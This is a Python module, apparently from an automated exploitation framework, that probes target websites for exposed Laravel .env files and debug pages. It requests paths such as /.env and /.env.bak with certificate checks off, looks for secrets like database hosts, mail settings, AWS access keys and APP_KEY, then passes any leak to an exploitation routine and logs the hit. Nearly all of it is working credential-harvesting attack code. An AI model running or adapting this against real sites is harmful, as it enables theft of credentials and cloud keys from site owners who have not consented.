# cython: language_level=3

import threading
import urllib3
import requests
import src.utils.generics.generic as UtilsGenerics
from config.params import ConfigConst
from src.vulnerability.disclosure.common.extract_info_1 import Extact_info_Common_1
from src.vulnerability.services.exploit_info import ExploitInfo

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class ExploitEnvVuln:
    def __init__(self):
        self.ENV_LOCATION = [
            "/.env",
            "/laravel/.env",
            "/api/.env",
            "/new/.env",
            "/test/.env",
            "/core/.env",
            "/.env.save",
            "/.env.bak",
            "/admin/.env",
            "/old/.env",
        ]
        self.KEY_TO_FIND = [
            "APP_NAME=",
            "DB_HOST=",
            "MAIL_HOST=",
            "AWS_ACCESS_KEY_ID=",
            "<td>APP_KEY</td>",
        ]
        self.logger_vuln = UtilsGenerics.setup_logging(
            logger_name=f"{ConfigConst.LoggingConfig.LOGGER_VULN_NAME}",
            log_file=ConfigConst.LoggingConfig.VULN_LOG_FILE_PATH,
        )

        self.file_lock = threading.Lock()
        self.RESULT_VULN = ConfigConst.CommonPathConfig.RESULT_VULN
        self.exploit_info = ExploitInfo()
        self.exploit_info_env = Extact_info_Common_1()

    def run(self, url, session):
        found_envs = []
        success = False
        valid = True

        for env_loc in self.ENV_LOCATION:
            try:
                response_redi_false = session.get(
                    f"{url}{env_loc}",
                    timeout=10,
                    allow_redirects=False,
                    verify=False,
                ).text
                if any(keyword in response_redi_false for keyword in self.KEY_TO_FIND):
                    found_envs.append(f"{url}{env_loc}")
                    is_success_xplt_info = self.exploit_info.run(
                        self.exploit_info_env.run(
                            response_redi_false, f"{url}{env_loc}"
                        ),
                        url,
                        f"{url}{env_loc}",
                        session,
                    )
                    if is_success_xplt_info:
                        success = True
                    break
            except requests.ConnectionError as e:
                valid = False
                break
            except requests.Timeout:
                # Handle the timeout exception specifically
                valid = False
                break
            except ConnectionResetError as e:
                valid = False
                self.logger_vuln.warning(
                    f"ExploitEnvVuln - Connection reset by peer : {e} with url : {url}"
                )
                pass
            except requests.TooManyRedirects as e:
                self.logger_vuln.warning(
                    f"ExploitOsintVuln / make_request - Too many redirects for {url} : {e}"
                )
                return None
            except requests.RequestException as e:
                if hasattr(e, "response") and e.response:
                    if e.response.is_redirect:
                        continue
                    else:
                        self.logger_vuln.error(
                            f"ExploitEnvVuln - DEBUG error : {e} with url : {url}"
                        )
                        continue
            except Exception as e:
                self.logger_vuln.error(
                    f"ExploitEnvVuln - DEBUG error : {e} with url : {url}"
                )
                continue

        if valid and not success:
            try:
                response_debug_redi_true = session.post(
                    f"{url}",
                    data={1: 1},
                    verify=False,
                    allow_redirects=False,
                    timeout=10,
                ).text
                if any(
                    keyword in response_debug_redi_true for keyword in self.KEY_TO_FIND
                ):
                    found_envs.append(f"{url} (via POST)")
                    is_success_xplt_info_debug = ExploitInfo().run(
                        Extact_info_Common_1().run(
                            response_debug_redi_true, f"{url} (via POST)"
                        ),
                        url,
                        f"{url} (via POST)",
                        session,
                    )
                    if is_success_xplt_info_debug:
                        success = True

            except requests.ConnectionError as e:
                pass
            except requests.Timeout:
                pass
            except ConnectionResetError as e:
                valid = False
                self.logger_vuln.warning(
                    f"ExploitEnvVuln - Connection reset by peer : {e} with url : {url}"
                )
                pass
            except requests.TooManyRedirects as e:
                self.logger.warning(
                    f"ExploitOsintVuln / make_request - Too many redirects for {url}: {e}"
                )
                return None
            except Exception as e:
                self.logger_vuln.error(
                    f"ExploitEnvVuln - DEBUG error : {e} with url : {url}"
                )
                pass

        if found_envs:
            for link in found_envs:
                UtilsGenerics.push_result(self, self.RESULT_VULN, f"{link}\n")
        return success
